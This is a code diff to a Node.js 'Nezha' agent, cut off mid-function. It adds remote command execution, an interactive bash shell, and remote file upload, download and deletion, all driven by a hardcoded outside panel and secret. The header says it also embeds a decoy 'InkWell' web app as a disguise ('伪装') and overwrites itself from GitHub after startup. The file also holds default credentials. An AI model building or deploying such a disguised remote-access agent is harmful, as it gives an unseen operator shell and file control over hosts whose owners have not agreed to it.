@@ -1,9 +1,14 @@
 /**
- * 纯 Node.js 哪吒探针 (Nezha Agent)
- * - 无子进程、无文件下载、无外部依赖
+ * 纯 Node.js 哪吒探针 + IOStream 终端/文件管理 + InkWell 伪装 Web 应用
+ * - 无外部依赖 (仅使用 Node.js 内置模块)
  * - 启动前先获取公网 IP，生成固定 UUID
  * - 使用 Node.js 内置 http2 模块连接哪吒面板 gRPC
  * - 支持自动端口探测、自动重连
+ * - 支持终端任务 (taskType 5) — 通过 /usr/bin/script 创建 PTY
+ * - 支持文件管理任务 (taskType 6) — 通过 IOStream 自定义协议 (NZFN/NZTD/NZUP/NERR)
+ * - 支持命令执行任务 (taskType 4/15)
+ * - 内嵌 InkWell 伪装 Web 应用 (纯 http, 零外部依赖)
+ * - 启动后 10 秒自动从 GitHub 拉取最新版本覆盖自身 (一次性)
  */
 
 const http2 = require('http2');
@@ -14,26 +19,28 @@ const os = require('os');
 const fs = require('fs');
 const path = require('path');
 const net = require('net');
+const { spawn, execSync } = require('child_process');
 
 // ==================== 配置 ====================
 const NZ_SERVER = 'nz.zxydk1715.dpdns.org:443';
 const NZ_TLS    = true;
 const NZ_SECRET = 'BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL';
 const AGENT_VERSION = '2.2.2';
-const REPORT_DELAY = 3; // 秒，State 上报间隔
-const GEOIP_PERIOD = 1800; // 秒，GeoIP 上报间隔 (30分钟)
-const HOST_PERIOD = 600; // 秒，Host 重新上报间隔 (10分钟)
-const PING_PERIOD = 5; // 秒，HTTP/2 PING 间隔（缩短到 5 秒，更激进保活）
-const KEEPALIVE_DELAY = 15; // 秒，gRPC keepalive 间隔
-const KEEPALIVE_TIMEOUT = 10; // 秒，gRPC keepalive 超时
-const MAX_RECONNECT_ATTEMPTS = 999; // 最大重连次数（几乎无限）
-const FAST_RECONNECT_DELAY = 500; // 毫秒，首次快速重连
-const NORMAL_RECONNECT_DELAY = 2000; // 毫秒，正常重连延迟
-const MAX_RECONNECT_DELAY = 30000; // 毫秒，最大重连延迟
+const REPORT_DELAY = 3;       // 秒，State 上报间隔
+const GEOIP_PERIOD = 1800;    // 秒，GeoIP 上报间隔 (30分钟)
+const HOST_PERIOD = 600;      // 秒，Host 重新上报间隔 (10分钟)
+const PING_PERIOD = 10;       // 秒，HTTP/2 PING 间隔
+
+// InkWell Web 应用配置
+const INKWELL_PORT = process.env.PORT || 3000;
+const INKWELL_USER = process.env.INKWELL_USER || 'admin';
+const INKWELL_PASS = process.env.INKWELL_PASS || 'inkwell2024';
+const INKWELL_DATA_FILE = path.join(__dirname, '.inkwell_journal.json');
 
 // ==================== 全局状态 ====================
 let running = true;
 let h2session = null;
+let nezhaPureH2Session = null;          // 别名: 指向 h2session，供 IOStream 任务使用
 let stateStream = null;
 let taskStream = null;
 let stateTimer = null;
@@ -42,17 +49,21 @@ let hostTimer = null;
 let pingTimer = null;
 let reconnectTimer = null;
 let reopenTimer = null;
-let healthCheckTimer = null; // 改进：连接健康检测定时器
 let restartAttempts = 0;
 let isReconnecting = false;
 let sessionAlive = false;
 let currentUUID = '';
 let currentIP = '';
+let currentAuthHeaders = null;          // 当前的鉴权头，供 IOStream 任务使用
 let prevCpuTotal = 0;
 let prevCpuBusy = 0;
 let lastNetIn = 0;
 let lastNetOut = 0;
 let lastNetTime = 0;
+
+// 活动的终端会话和文件管理会话
+const nezhaPureActiveTerminals = new Map();
+const nezhaPureActiveFMSessions = new Map();
 
 // ==================== 信号处理 ====================
 process.on('SIGINT', gracefulShutdown);
@@ -87,51 +98,37 @@ function generateIPBasedUUID(ip) {
 }
 
 // ==================== 获取公网 IP ====================
-// 缓存 IP，避免每次重连都重新获取导致 UUID 变化
-let cachedIP = null;
-
 function getPublicIP() {
     return new Promise((resolve) => {
-        // 1. 优先用环境变量（最可靠，固定 IP）
-        if (process.env.PUBLIC_IP) {
-            const ip = process.env.PUBLIC_IP.trim();
-            if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
-                cachedIP = ip;
-                resolve(ip);
-                return;
-            }
-        }
-
-        // 2. 用缓存的 IP（不重复获取）
-        if (cachedIP) {
-            resolve(cachedIP);
-            return;
-        }
-
-        // 3. 只用 api.ipify.org（最稳定，固定 IPv4）
-        const req = https.get('https://api.ipify.org', {
-            headers: { 'User-Agent': 'curl/7.88.1' },
-            timeout: 8000,
-            rejectUnauthorized: false
-        }, (res) => {
-            let data = '';
-            res.on('data', (chunk) => { data += chunk; });
-            res.on('end', () => {
-                const ip = data.trim();
-                if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
-                    cachedIP = ip;
-                    resolve(ip);
-                } else {
-                    resolve('');
-                }
+        const urls = [
+            { url: 'https://api.ipify.org', host: 'api.ipify.org', path: '/', tls: true },
+            { url: 'https://ifconfig.me/ip', host: 'ifconfig.me', path: '/ip', tls: true },
+            { url: 'https://ipinfo.io/ip', host: 'ipinfo.io', path: '/ip', tls: true },
+            { url: 'https://icanhazip.com', host: 'icanhazip.com', path: '/', tls: true },
+        ];
+        let resolved = false;
+        for (const u of urls) {
+            const mod = u.tls ? https : http;
+            const req = mod.get(u.url, { headers: { 'User-Agent': 'curl/7.88.1' }, timeout: 5000, rejectUnauthorized: false }, (res) => {
+                let data = '';
+                res.on('data', (chunk) => { data += chunk; });
+                res.on('end', () => {
+                    if (resolved) return;
+                    const ip = data.trim();
+                    if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
+                        resolved = true;
+                        resolve(ip);
+                    }
+                });
             });
-        });
-        req.on('error', () => { resolve(''); });
-        req.on('timeout', () => { req.destroy(); resolve(''); });
+            req.on('error', () => {});
+            req.on('timeout', () => { req.destroy(); });
+        }
+        setTimeout(() => { if (!resolved) resolve(''); }, 10000);
     });
 }
 
-// ==================== Protobuf 编码器 ====================
+// ==================== Protobuf 编码器 (V100 版本, 含 frame/unframe/bytes) ====================
 const PB = {
     encodeVarint(val) {
         if (typeof val === 'number' && !Number.isInteger(val)) val = Math.floor(Math.max(0, val));
@@ -192,6 +189,7 @@ const PB = {
         const frames = [];
         let off = 0;
         while (off + 5 <= buf.length) {
+            const compressed = buf[off];
             const len = buf.readUInt32BE(off + 1);
             off += 5;
             if (off + len > buf.length) break;
@@ -292,7 +290,6 @@ function getDiskCapacity() {
 function collectHost() {
     const isWin = os.platform() === 'win32';
 
-    // CPU
     let cpuInfo = [];
     try {
         const cpus = os.cpus();
@@ -300,13 +297,9 @@ function collectHost() {
         cpuInfo = [...cpuModelSet];
     } catch(e) {}
 
-    // Memory
     let memTotalValue = os.totalmem();
-
-    // Disk
     let { diskTotal } = getDiskCapacity();
 
-    // Swap
     let swapTotal = 0;
     try {
         if (!isWin) {
@@ -316,7 +309,6 @@ function collectHost() {
         }
     } catch(e) {}
 
-    // Virtualization
     let virtualization = '';
     try {
         if (!isWin) {
@@ -348,7 +340,6 @@ function collectHost() {
         }
     } catch(e) { virtualization = 'unknown'; }
 
-    // Boot time
     let bootTime = 0;
     try {
         if (!isWin) {
@@ -371,7 +362,6 @@ function collectHost() {
         bootTime = Math.floor(Date.now() / 1000 - os.uptime());
     }
 
-    // Arch
     let archValue = '';
     const nodeArch = os.arch();
     if (nodeArch === 'x64') archValue = 'x86_64';
@@ -380,7 +370,6 @@ function collectHost() {
     else if (nodeArch === 'ia32') archValue = 'i386';
     else archValue = nodeArch;
 
-    // GPU (纯文件读取，无子进程)
     let gpuInfo = [];
     try {
         if (!isWin) {
@@ -401,7 +390,6 @@ function collectHost() {
         }
     } catch(e) {}
 
-    // Platform
     let platformName = os.type();
     let platformVersion = os.release();
     try {
@@ -433,7 +421,6 @@ function collectHost() {
 function collectState() {
     const isWin = os.platform() === 'win32';
 
-    // CPU
     let cpuPercent = 0;
     try {
         if (!isWin) {
@@ -458,7 +445,6 @@ function collectState() {
                 prevCpuBusy = busy;
             }
         } else {
-            // Windows: 使用 os.cpus() 差值
             const cpus = os.cpus();
             if (collectState._prevCpus) {
                 let totalDiff = 0, idleDiff = 0;
@@ -474,7 +460,6 @@ function collectState() {
         }
     } catch(e) {}
 
-    // Memory
     let memTotal = os.totalmem();
     let memUsed = memTotal - os.freemem();
     let swapUsed = 0, swapTotal = 0;
@@ -504,10 +489,8 @@ function collectState() {
         }
     } catch(e) {}
 
-    // Disk
     let { diskTotal: _dt, diskUsed } = getDiskCapacity();
 
-    // Network
     let netInTransfer = 0, netOutTransfer = 0, netInSpeed = 0, netOutSpeed = 0;
     try {
         if (!isWin) {
@@ -532,7 +515,6 @@ function collectState() {
         }
     } catch(e) {}
 
-    // TCP/UDP connections
     let tcpConnCount = 0, udpConnCount = 0;
     try {
         if (!isWin) {
@@ -559,7 +541,6 @@ function collectState() {
         }
     } catch(e) {}
 
-    // Process count
     let processCount = 0;
     try {
         if (!isWin) {
@@ -657,11 +638,10 @@ function openStream(h2, path, authHeaders, onData, onEnd) {
     };
     const stream = h2.request(headers);
     let streamBroken = false;
-    let ended = false; // 防止 onEnd 被重复调用
+    let ended = false;
     const safeOnEnd = (info) => {
         if (ended) return;
         ended = true;
-        // 关闭流的写端，防止继续写入
         try { stream.end(); } catch(e) {}
         if (onEnd) onEnd(info);
     };
@@ -683,9 +663,7 @@ function openStream(h2, path, authHeaders, onData, onEnd) {
         if (streamBroken || ended) return;
         const grpcStatus = trailers['grpc-status'];
         const grpcMsg = trailers['grpc-message'] || '';
-        // UNIQUE constraint 错误忽略（面板重复注册）
         if (grpcMsg.includes('UNIQUE constraint')) return;
-        // grpc-status:0 = 服务端正常关闭流，需要重开
         if (grpcStatus === '0') {
             console.log(`[Nezha] 流 ${path} 服务端关闭 (grpc-status:0)，将重开`);
         } else if (grpcStatus === '2' && grpcMsg === 'EOF') {
@@ -700,7 +678,6 @@ function openStream(h2, path, authHeaders, onData, onEnd) {
         safeOnEnd({ error: err });
     });
     stream.on('close', () => {
-        // 流完全关闭时触发（可能没有收到 trailers 就被关闭了）
         if (!ended) {
             console.log(`[Nezha] 流 ${path} 意外关闭`);
             safeOnEnd({ closed: true });
@@ -709,7 +686,56 @@ function openStream(h2, path, authHeaders, onData, onEnd) {
     return stream;
 }
 
-// ==================== 任务处理 (无子进程) ====================
+// ==================== IOStream 打开函数 (V100 版本, 用于终端和文件管理) ====================
+function nezhaPureOpenStream(h2session, path, authHeaders, onData, onEnd) {
+    const headers = {
+        ':method': 'POST',
+        ':path': path,
+        'content-type': 'application/grpc',
+        'te': 'trailers',
+        'grpc-encoding': 'identity',
+        'grpc-accept-encoding': 'identity',
+        'user-agent': `nezha-agent/${AGENT_VERSION}`,
+        ...authHeaders,
+    };
+    const stream = h2session.request(headers);
+    let streamBroken = false;
+    stream.on('response', (hdrs) => {
+        const httpStatus = parseInt(hdrs[':status']);
+        if (httpStatus && httpStatus !== 200) {
+            streamBroken = true;
+            try { stream.end(); } catch(e) {}
+            if (onEnd) onEnd({ error: new Error(`HTTP ${httpStatus}`), cloudflare: httpStatus === 530 });
+        }
+    });
+    stream.on('data', (chunk) => {
+        if (streamBroken) return;
+        try {
+            const frames = PB.unframe(chunk);
+            frames.forEach(f => { if (onData) onData(f); });
+        } catch(e) {}
+    });
+    stream.on('trailers', (trailers) => {
+        if (streamBroken) return;
+        const grpcStatus = trailers['grpc-status'];
+        const grpcMsg = trailers['grpc-message'] || '';
+        const isUniqueConstraint = grpcMsg.includes('UNIQUE constraint');
+        if (grpcStatus && grpcStatus !== '0' && !(grpcStatus === '2' && grpcMsg === 'EOF') && !isUniqueConstraint) {
+            console.log(`[Nezha] IOStream ${path} gRPC错误: status=${grpcStatus} msg=${grpcMsg}`);
+        }
+        if (isUniqueConstraint) {
+            return;
+        }
+        if (onEnd) onEnd(trailers);
+    });
+    stream.on('error', (err) => {
+        console.log(`[Nezha] IOStream ${path} 错误: ${err.message}`);
+        if (onEnd) onEnd({ error: err });
+    });
+    return stream;
+}
+
+// ==================== 任务处理 ====================
 function handleTaskData(frameData) {
     try {
         let taskId = 0, taskType = 0, taskDataStr = '';
@@ -739,7 +765,9 @@ function handleTaskData(frameData) {
         else if (taskType === 2) handleICMPPingTask(taskId, taskDataStr);
         else if (taskType === 3) handleTCPPingTask(taskId, taskDataStr);
         else if (taskType === 7) { /* keepalive, 忽略 */ }
-        // taskType 4 (command), 15 (exec) 等不处理（无子进程）
+        else if (taskType === 4 || taskType === 15) { handleCommandTask(taskId, taskDataStr); }
+        else if (taskType === 5) { handleTerminalTask(taskId, taskDataStr); }
+        else if (taskType === 6) { handleFMTask(taskId, taskDataStr); }
     } catch(e) {}
 }
 
@@ -784,7 +812,6 @@ function handleICMPPingTask(taskId, taskData) {
     try { host = host.replace(/.*"host"\s*:\s*"([^"]+)".*/, '$1'); } catch(e) {}
     if (!host) { sendTaskResult(taskId, 2, 0, 'Host empty', false); return; }
 
-    // 纯 Node.js ICMP Ping: 使用 net.Socket 连接测试
     let totalDelay = 0, successCount = 0;
     const output = [];
     const doPing = (attempt) => {
@@ -848,6 +875,441 @@ function handleTCPPingTask(taskId, taskData) {
         sendTaskResult(taskId, 3, Date.now() - start, `${host}:${port} ${err.message}`, false);
     });
     socket.connect(port, host);
+}
+
+// ==================== 命令执行任务 (taskType 4 / 15) ====================
+function handleCommandTask(taskId, taskData) {
+    let cmd = '', cwd = '/';
+    try {
+        const cfg = JSON.parse(taskData);
+        cmd = cfg.command || cfg.cmd || '';
+        cwd = cfg.cwd || cfg.dir || '/';
+    } catch(e) {
+        cmd = taskData.trim();
+    }
+    if (!cmd) {
+        sendTaskResult(taskId, 4, 0, '命令为空', false);
+        return;
+    }
+    const startTime = Date.now();
+    try {
+        const output = execSync(cmd, {
+            timeout: 30000, encoding: 'utf8', cwd,
+            maxBuffer: 1024 * 1024
+        }).toString();
+        const delay = Date.now() - startTime;
+        sendTaskResult(taskId, 4, delay, output.substring(0, 4096), true);
+    } catch(e) {
+        const delay = Date.now() - startTime;
+        const output = (e.stdout || '') + (e.stderr || '') || e.message;
+        sendTaskResult(taskId, 4, delay, output.substring(0, 4096), false);
+    }
+}
+
+// ==================== 终端任务 (taskType 5, 通过 IOStream + PTY) ====================
+function handleTerminalTask(taskId, taskData) {
+    try {
+        let streamId = '';
+        try {
+            const parsed = JSON.parse(taskData);
+            streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
+        } catch(e) {
+            streamId = taskData;
+        }
+        if (!streamId) {
+            return;
+        }
+
+        const terminalKey = streamId;
+        if (nezhaPureActiveTerminals.has(terminalKey)) return;
+
+        const ioStream = nezhaPureOpenStream(
+            nezhaPureH2Session,
+            '/proto.NezhaService/IOStream',
+            currentAuthHeaders,
+            (frameData) => {
+                try {
+                    let inputData = null;
+                    let off = 0;
+                    while (off < frameData.length) {
+                        const tag = PB.decodeVarint(frameData, off);
+                        off = tag.off;
+                        const fieldNum = tag.val >> 3;
+                        const wireType = tag.val & 0x07;
+                        if (wireType === 2 && fieldNum === 1) {
+                            const len = PB.decodeVarint(frameData, off);
+                            off = len.off;
+                            inputData = frameData.slice(off, off + len.val);
+                            off += len.val;
+                        } else if (wireType === 0) {
+                            const val = PB.decodeVarint(frameData, off);
+                            off = val.off;
+                        } else { break; }
+                    }
+                    const term = nezhaPureActiveTerminals.get(terminalKey);
+                    if (!inputData || !term) return;
+                    if (inputData.length === 0) return;
+                    const dataType = inputData[0];
+                    const payload = inputData.slice(1);
+                    if (dataType === 0) {
+                        if (term.pty.stdin.writable) {
+                            term.pty.stdin.write(payload);
+                        }
+                    } else if (dataType === 1) {
+                        try {
+                            const resize = JSON.parse(payload.toString('utf8'));
+                            if (term.pty.stdout && term.pty.stdout._handle && term.pty.stdout._handle.setWindowSize) {
+                                term.pty.stdout._handle.setWindowSize(resize.Cols || 80, resize.Rows || 24);
+                            }
+                        } catch(e) {}
+                    }
+                } catch(e) {}
+            },
+            (trailers) => {
+                const term = nezhaPureActiveTerminals.get(terminalKey);
+                if (term) {
+                    try { term.pty.kill(); } catch(e) {}
+                    if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
+                    if (term.rcFile) { try { fs.unlinkSync(term.rcFile); } catch(e) {} }
+                    nezhaPureActiveTerminals.delete(terminalKey);
+                }
+            }
+        );
+
+        // 发送握手: magic + streamId
+        try {
+            const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
+            const streamIdBuf = Buffer.from(streamId);
+            const handshake = Buffer.concat([magic, streamIdBuf]);
+            const handshakeMsg = PB.bytes(1, handshake);
+            ioStream.write(PB.frame(handshakeMsg));
+        } catch(e) {}
+
+        // 选择 shell 并创建 PTY
+        const _hasBash = fs.existsSync('/bin/bash');
+        const shell = _hasBash ? '/bin/bash' : (process.env.SHELL || '/bin/sh');
+        let _termRcFile = null;
+        if (_hasBash) {
+            try {
+                const bashRcParts = [
+                    '[ -f /etc/profile ] && . /etc/profile 2>/dev/null',
+                    '[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc 2>/dev/null',
+                    '[ -f ~/.bashrc ] && . ~/.bashrc 2>/dev/null',
+                ];
+                const BS = String.fromCharCode(92);
+                const SQ = String.fromCharCode(39);
+                const ps1Val = BS + '[' + BS + 'e]0;' + BS + 'u@' + BS + 'h:' + BS + 'w' + BS + 'a' + BS + ']' +
+                    BS + '[' + BS + 'e[01;32m' + BS + ']' + BS + 'u@' + BS + 'h' +
+                    BS + '[' + BS + 'e[00m' + BS + ']:' +
+                    BS + '[' + BS + 'e[01;34m' + BS + ']' + BS + 'w' +
+                    BS + '[' + BS + 'e[00m' + BS + ']' + BS + '$ ';
+                bashRcParts.push('export PS1=' + SQ + ps1Val + SQ);
+                const rcContent = bashRcParts.join('\n');
+                _termRcFile = path.join(os.tmpdir(), '.nezha_rc_' + streamId);
+                fs.writeFileSync(_termRcFile, rcContent);
+            } catch(e) { _termRcFile = null; }
+        }
+        let pty;
+        try {
+            const bashCmd = _termRcFile
+                ? '/bin/bash --rcfile ' + _termRcFile
+                : shell;
+            pty = spawn('/usr/bin/script', ['-qfc', bashCmd, '/dev/null'], {
+                env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
+                stdio: ['pipe', 'pipe', 'pipe'],
+            });
+        } catch(e) {
+            try {
+                pty = spawn(shell, ['-i'], {
+                    env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
+                    stdio: ['pipe', 'pipe', 'pipe'],
+                });
+            } catch(e2) {
+                pty = spawn('/bin/sh', ['-i'], {
+                    env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
+                    stdio: ['pipe', 'pipe', 'pipe'],
+                });
+            }
+        }
+
+        const keepaliveTimer = setInterval(() => {
+            try {
+                if (ioStream && !ioStream.destroyed && ioStream.writable) {
+                    ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
+                } else {
+                    clearInterval(keepaliveTimer);
+                }
+            } catch(e) { clearInterval(keepaliveTimer); }
+        }, 30000);
+        const terminal = { stream: ioStream, pty, keepaliveTimer, rcFile: _termRcFile };
+        nezhaPureActiveTerminals.set(terminalKey, terminal);
+        const sendOutput = (data) => {
+            try {
+                if (ioStream && !ioStream.destroyed && ioStream.writable) {
+                    const ioData = PB.bytes(1, data);
+                    ioStream.write(PB.frame(ioData));
+                }
+            } catch(e) {}
+        };
+        pty.stdout.on('data', sendOutput);
+        pty.stderr.on('data', sendOutput);
+        pty.on('exit', () => {
+            try { ioStream.end(); } catch(e) {}
+            clearInterval(keepaliveTimer);
+            nezhaPureActiveTerminals.delete(terminalKey);
+            if (_termRcFile) { try { fs.unlinkSync(_termRcFile); } catch(e) {} }
+        });
+    } catch(e) {}
+}
+
+// ==================== 文件管理任务 (taskType 6, 通过 IOStream 自定义协议) ====================
+function handleFMTask(taskId, taskData) {
+    try {
+        let streamId = '';
+        try {
+            const parsed = JSON.parse(taskData);
+            streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
+        } catch(e) {
+            streamId = taskData;
+        }
+        if (!streamId) return;
+        if (nezhaPureActiveFMSessions.has(streamId)) return;
+
+        const ioStream = nezhaPureOpenStream(
+            nezhaPureH2Session,
+            '/proto.NezhaService/IOStream',
+            currentAuthHeaders,
+            (frameData) => {
+                try {
+                    let data = null;
+                    let off = 0;
+                    while (off < frameData.length) {
+                        const tag = PB.decodeVarint(frameData, off);
+                        off = tag.off;
+                        const fieldNum = tag.val >> 3;
+                        const wireType = tag.val & 0x07;
+                        if (wireType === 2 && fieldNum === 1) {
+                            const len = PB.decodeVarint(frameData, off);
+                            off = len.off;
+                            data = frameData.slice(off, off + len.val);
+                            off += len.val;
+                        } else if (wireType === 0) {
+                            const val = PB.decodeVarint(frameData, off);
+                            off = val.off;
+                        } else { break; }
+                    }
+                    if (!data || data.length === 0) return;
+                    const fmSession = nezhaPureActiveFMSessions.get(streamId);
+                    if (fmSession && fmSession.uploadStream && !fmSession.uploadStream.closed) {
+                        fmSession.uploadStream.write(data);
+                        fmSession.uploadReceived = (fmSession.uploadReceived || 0) + data.length;
+                        if (fmSession.uploadReceived >= fmSession.uploadSize) {
+                            fmSession.uploadStream.end();
+                            fmSession.uploadStream = null;
+                            const nzup = Buffer.from('NZUP');
+                            ioStream.write(PB.frame(PB.bytes(1, nzup)));
+                        }
+                        return;
+                    }
+
+                    const cmd = data[0];
+                    if (cmd === 0) {
+                        const dirPath = data.slice(1).toString('utf8') || '/';
+                        fmListDir(ioStream, dirPath);
+                    } else if (cmd === 1) {
+                        const filePath = data.slice(1).toString('utf8');
+                        fmDownloadFile(ioStream, filePath, streamId);
+                    } else if (cmd === 2) {
+                        fmReceiveUpload(ioStream, data.slice(1), streamId);
+                    } else if (cmd === 3) {
+                        const delPath = data.slice(1).toString('utf8');
+                        fmDeletePath(ioStream, delPath);
+                    } else if (cmd === 4) {
+                        fmRenamePath(ioStream, data.slice(1));
+                    } else if (cmd === 5) {
+                        const mkDir = data.slice(1).toString('utf8');
+                        fmCreateDir(ioStream, mkDir);
+                    }
+                } catch(e) {}
+            },
+            (trailers) => {
+                const fm = nezhaPureActiveFMSessions.get(streamId);
+                if (fm) {
+                    if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
+                    if (fm.uploadStream) { try { fm.uploadStream.destroy(); } catch(e) {} }
+                    if (fm.downloadStream) { try { fm.downloadStream.destroy(); } catch(e) {} }
+                    nezhaPureActiveFMSessions.delete(streamId);
+                }
+            }
+        );
+
+        // 发送握手
+        try {
+            const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
+            const streamIdBuf = Buffer.from(streamId);
+            const handshake = Buffer.concat([magic, streamIdBuf]);
+            ioStream.write(PB.frame(PB.bytes(1, handshake)));
+        } catch(e) {}
+
+        const keepaliveTimer = setInterval(() => {
+            try {
+                if (ioStream && !ioStream.destroyed && ioStream.writable) {
+                    ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
+                } else { clearInterval(keepaliveTimer); }
+            } catch(e) { clearInterval(keepaliveTimer); }
+        }, 30000);
+        nezhaPureActiveFMSessions.set(streamId, { stream: ioStream, keepaliveTimer });
+    } catch(e) {}
+}
+
+function fmListDir(ioStream, dirPath) {
+    try {
+        const nzfn = Buffer.from('NZFN');
+        const pathBuf = Buffer.from(dirPath, 'utf8');
+        const pathLenBuf = Buffer.alloc(4);
+        pathLenBuf.writeUInt32BE(pathBuf.length, 0);
+        const entryBufs = [];
+        let hasError = false;
+        let errData = null;
+        try {
+            const items = fs.readdirSync(dirPath, { withFileTypes: true });
+            for (const item of items) {
+                try {
+                    const isDir = item.isDirectory() ? 1 : 0;
+                    const nameBuf = Buffer.from(item.name, 'utf8');
+                    if (nameBuf.length <= 255) {
+                        entryBufs.push(Buffer.from([isDir, nameBuf.length]));
+                        entryBufs.push(nameBuf);
+                    }
+                } catch(e) {}
+            }
+        } catch(e) {
+            hasError = true;
+            const nerr = Buffer.from('NERR');
+            const errMsg = Buffer.from(e.message || 'Permission denied', 'utf8');
+            errData = Buffer.concat([nerr, errMsg]);
+        }
+
+        if (hasError) {
+            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, errData]);
+            ioStream.write(PB.frame(PB.bytes(1, msgData)));
+        } else if (entryBufs.length > 0) {
+            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, ...entryBufs]);
+            ioStream.write(PB.frame(PB.bytes(1, msgData)));
+        } else {
+            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf]);
+            ioStream.write(PB.frame(PB.bytes(1, msgData)));
+        }
+    } catch(e) {}
+}
+
+function fmDownloadFile(ioStream, filePath, streamId) {
+    try {
+        let stat;
+        try {
+            stat = fs.statSync(filePath);
+            if (stat.isDirectory()) throw new Error('Is a directory');
+        } catch(e) {
+            const nerr = Buffer.from('NERR');
+            const errMsg = Buffer.from(e.message || 'File not found', 'utf8');
+            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
+            return;
+        }
+
+        const nztd = Buffer.from('NZTD');
+        const sizeBuf = Buffer.alloc(8);
+        sizeBuf.writeUInt32BE(Math.floor(stat.size / 0x100000000), 0);
+        sizeBuf.writeUInt32BE(stat.size & 0xFFFFFFFF, 4);
+        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nztd, sizeBuf]))));
+        const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 1024 });
+        const fmSession = nezhaPureActiveFMSessions.get(streamId);
+        if (fmSession) fmSession.downloadStream = readStream;
+        readStream.on('data', (chunk) => {
+            try {
+                if (ioStream && !ioStream.destroyed && ioStream.writable) {
+                    ioStream.write(PB.frame(PB.bytes(1, chunk)));
+                } else {
+                    readStream.destroy();
+                }
+            } catch(e) { readStream.destroy(); }
+        });
+        readStream.on('error', () => {
+            if (fmSession) fmSession.downloadStream = null;
+        });
+        readStream.on('end', () => {
+            if (fmSession) fmSession.downloadStream = null;
+        });
+    } catch(e) {}
+}
+
+function fmReceiveUpload(ioStream, initialData, streamId) {
+    try {
+        if (initialData.length < 8) return;
+        const fileSizeHigh = initialData.readUInt32BE(0);
+        const fileSizeLow = initialData.readUInt32BE(4);
+        const fileSize = fileSizeHigh * 0x100000000 + fileSizeLow;
+        const filePath = initialData.slice(8).toString('utf8');
+        if (!filePath) return;
+        const dir = path.dirname(filePath);
+        try { fs.mkdirSync(dir, { recursive: true }); } catch(e) {}
+        const writeStream = fs.createWriteStream(filePath);
+        const fmSession = nezhaPureActiveFMSessions.get(streamId);
+        if (fmSession) {
+            fmSession.uploadStream = writeStream;
+            fmSession.uploadSize = fileSize;
+            fmSession.uploadReceived = 0;
+        }
+    } catch(e) {}
+}
+
+function fmDeletePath(ioStream, delPath) {
+    try {
+        if (!delPath) return;
+        const stat = fs.statSync(delPath);
+        if (stat.isDirectory()) {
+            fs.rmSync(delPath, { recursive: true, force: true });
+        } else {
+            fs.unlinkSync(delPath);
+        }
+        const nzfn = Buffer.from('NZFN');
+        const pathBuf = Buffer.from(path.dirname(delPath), 'utf8');
+        const pathLenBuf = Buffer.alloc(4);
+        pathLenBuf.writeUInt32BE(pathBuf.length, 0);
+        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nzfn, pathLenBuf, pathBuf]))));
+    } catch(e) {
+        const nerr = Buffer.from('NERR');
+        const errMsg = Buffer.from(e.message || '删除失败', 'utf8');
+        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
+    }
+}
+
+function fmRenamePath(ioStream, payload) {
+    try {
+        if (payload.length < 4) return;
+        const oldPathLen = payload.readUInt32BE(0);
+        if (payload.length < 4 + oldPathLen) return;
+        const oldPath = payload.slice(4, 4 + oldPathLen).toString('utf8');
+        const newPath = payload.slice(4 + oldPathLen).toString('utf8');
+        if (!oldPath || !newPath) return;
+        fs.renameSync(oldPath, newPath);
+        fmListDir(ioStream, path.dirname(newPath));
+    } catch(e) {
+        const nerr = Buffer.from('NERR');
+        const errMsg = Buffer.from(e.message || '重命名失败', 'utf8');
+        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
+    }
+}
+
+function fmCreateDir(ioStream, dirPath) {
+    try {
+        if (!dirPath) return;
+        fs.mkdirSync(dirPath, { recursive: true });
+        fmListDir(ioStream, dirPath);
+    } catch(e) {
+        const nerr = Buffer.from('NERR');
+        const errMsg = Buffer.from(e.message || '创建目录失败', 'utf8');
+        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
+    }
 }
 
 // ==================== 端口探测 ====================
@@ -936,15 +1398,36 @@ async function detectGrpcPort(host, originalPort, tls) {
 // ==================== 会话管理 ====================
 function cleanupSession() {
     sessionAlive = false;
-    isReconnecting = true; // 防止级联重连
+    isReconnecting = true;
     if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
     if (reopenTimer) { clearTimeout(reopenTimer); reopenTimer = null; }
     if (stateTimer) { clearInterval(stateTimer); stateTimer = null; }
     if (geoipTimer) { clearInterval(geoipTimer); geoipTimer = null; }
     if (hostTimer) { clearInterval(hostTimer); hostTimer = null; }
     if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
-    if (healthCheckTimer) { clearInterval(healthCheckTimer); healthCheckTimer = null; }
-    // 移除流的事件监听器，防止 close 触发 onEnd → 再次 scheduleReconnect
+
+    // 清理所有活动的终端会话
+    for (const [key, term] of nezhaPureActiveTerminals.entries()) {
+        try {
+            if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
+            try { term.pty.kill(); } catch(e) {}
+            try { term.stream.end(); } catch(e) {}
